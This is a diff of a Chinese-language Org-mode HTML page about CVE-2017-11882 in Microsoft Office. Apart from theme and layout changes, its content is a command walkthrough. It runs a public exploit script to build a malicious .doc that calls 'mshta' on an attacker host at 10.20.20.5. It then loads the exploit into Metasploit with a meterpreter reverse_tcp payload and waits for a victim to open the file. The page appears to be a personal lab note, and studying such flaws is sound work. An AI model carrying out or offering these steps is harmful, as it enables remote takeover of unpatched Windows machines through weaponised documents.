@@ -1,20 +1,55 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-12-31 Sat 00:22 -->
+<!-- 2023-02-02 Thu 21:55 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>CVE-2017-11882</title>
 <meta name="author" content="Honbey Zhang" />
 <meta name="generator" content="Org Mode" />
-<link rel="stylesheet" href="../resources/orgmode.css" type="text/css"/>
+
+                     <!--
+                     <link rel="stylesheet" href="../resources/orgmode.css" type="text/css"/>
                      <link rel="stylesheet" href="../resources/style.css" type="text/css"/>
+                     -->
+                     <!--
+                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/htmlize.css" type="text/css"/>
+                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/bigblow.css" type="text/css"/>
+                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/hideshow.css" type="text/css"/>
+                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery-1.11.0.min.js"></script>
+                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery-ui-1.10.2.min.js"></script>
+                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.localscroll-min.js"></script>
+                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.scrollTo-1.4.3.1-min.js"></script>
+                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.zclip.min.js"></script>
+                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/bigblow.js"></script>
+                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/hideshow.js"></script>
+                     <script type="text/javascript" src="../resources/src/lib/js/jquery.stickytableheaders.min.js"></script>
+                     -->
+                     <link rel="stylesheet" href="../resources/src/readtheorg_theme/css/htmlize.css" type="text/css"/>
+                     <link rel="stylesheet" href="../resources/src/readtheorg_theme/css/readtheorg.css" type="text/css"/>
+                     <script type="text/javascript" src="../resources/src/lib/js/jquery.min.js"></script>
+                     <script type="text/javascript" src="../resources/src/lib/js/bootstrap.min.js"></script>
+                     <script type="text/javascript" src="../resources/src/lib/js/jquery.stickytableheaders.min.js"></script>
+                     <script type="text/javascript" src="../resources/src/readtheorg_theme/js/readtheorg.js"></script>
 </head>
 <body>
 <div id="content" class="content">
 <header>
 <h1 class="title">CVE-2017-11882</h1>
-</header>
+</header><nav id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#org4da951e">Introduction</a>
+<ul>
+<li><a href="#orgfcd274c">步骤</a></li>
+<li><a href="#orgd6de167">参考链接</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</nav>
+
 <div id="outline-container-org4da951e" class="outline-2">
 <h2 id="org4da951e">Introduction</h2>
 <div class="outline-text-2" id="text-org4da951e">
@@ -37,11 +72,11 @@ CVE-2017-1188 是微软公布的一个远程执行漏洞，通杀目前市面上
 Bash
 </p>
 <div class="org-src-container">
-<pre class="src src-bash"><span style="color: #006DAF;">unzip</span> CVE-2017-11882.zip
-<span style="color: #006DAF;">python</span> CVE-2017-11882/cve-2017-11882.py <span style="color: #D0372D;">-c</span> <span style="color: #008000;">"cmd.exe /c calc.exe"</span> <span style="color: #D0372D;">-c</span> <span style="color: #008000;">"calc.doc"</span> <span style="color: #8D8D84; font-style: italic;"># test</span>
-<span style="color: #006DAF;">python</span> CVE-2017-11882/cve-2017-11882.py <span style="color: #D0372D;">-c</span> <span style="color: #008000;">"mshta http://10.20.20.5:8080/path"</span> <span style="color: #D0372D;">-c</span> <span style="color: #008000;">"classTable.doc"</span>
-<span style="color: #006DAF;">cp</span> CVE-2017-11882/cve-2017-11882.rtf /usr/share/metasploit-framework/data/exploits/
-<span style="color: #006DAF;">cp</span> CVE-2017-11882/cve_2017_11882.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/msfconsole
+<pre class="src src-bash">unzip CVE-2017-11882.zip
+python CVE-2017-11882/cve-2017-11882.py -c "cmd.exe /c calc.exe" -c "calc.doc" # test
+python CVE-2017-11882/cve-2017-11882.py -c "mshta http://10.20.20.5:8080/path" -c "classTable.doc"
+cp CVE-2017-11882/cve-2017-11882.rtf /usr/share/metasploit-framework/data/exploits/
+cp CVE-2017-11882/cve_2017_11882.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/msfconsole
 </pre>
 </div></li>
 
@@ -49,17 +84,17 @@ Bash
 msfconsole
 </p>
 <div class="org-src-container">
-<pre class="src src-bash"><span style="color: #006DAF;">reload_all</span>
-<span style="color: #006DAF;">search</span> CVE-2017-11882
-<span style="color: #006DAF;">use</span> exploit/windows/smb/cve_2017_11882
-<span style="color: #006FE0;">set</span> payload windows/meterpreter/reverse_tcp
-<span style="color: #006FE0;">set</span> lhost 10.20.20.5
-<span style="color: #006FE0;">set</span> uripath path
-<span style="color: #006DAF;">run</span> <span style="color: #8D8D84; font-style: italic;"># exploit</span>
-<span style="color: #8D8D84; font-style: italic;"># wait for target to open the 'classTable.doc' documnet</span>
-<span style="color: #8D8D84; font-style: italic;"># open or edit the 'calc.doc' will open calc.exe in Windows 7</span>
-<span style="color: #8D8D84; font-style: italic;"># but only edit the 'calc.doc' will open calc.exe in Windows 10</span>
-<span style="color: #8D8D84; font-style: italic;"># PS: Windows 10 must close Windows Defender</span>
+<pre class="src src-bash">reload_all
+search CVE-2017-11882
+use exploit/windows/smb/cve_2017_11882
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.20.20.5
+set uripath path
+run # exploit
+# wait for target to open the 'classTable.doc' documnet
+# open or edit the 'calc.doc' will open calc.exe in Windows 7
+# but only edit the 'calc.doc' will open calc.exe in Windows 10
+# PS: Windows 10 must close Windows Defender
 </pre>
 </div></li>
 </ol>
@@ -79,7 +114,13 @@ msfconsole
 </div>
 </div>
 <div id="postamble" class="status">
-<a href="https://beian.miit.gov.cn" target="_blank">湘ICP证019014083号</a>
+
+                     Theme
+                     <a href="https://github.com/fniessen/org-html-themes" target="_blank">bigblow/readtheorg</a>
+                     by
+                     <a href="https://github.com/fniessen" target="_blank">fniessen</a>
+                     <br>
+                     <a href="https://beian.miit.gov.cn" target="_blank">湘ICP证019014083号</a>
 </div>
 </body>
 </html>
